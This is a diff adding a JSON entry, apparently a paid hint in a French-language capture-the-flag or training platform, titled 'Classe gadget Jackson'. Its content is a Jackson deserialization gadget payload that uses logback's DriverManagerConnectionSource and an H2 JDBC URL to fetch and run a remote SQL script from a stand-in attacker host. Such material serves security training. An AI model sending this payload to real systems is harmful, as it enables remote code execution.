@@ -1,0 +1,7 @@
+[
+  {
+    "title": "Classe gadget Jackson",
+    "cost": 25,
+    "content": "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\": \"jdbc:h2:mem:;INIT=RUNSCRIPT FROM 'http://attacker/init.sql'\"}]"
+  }
+]
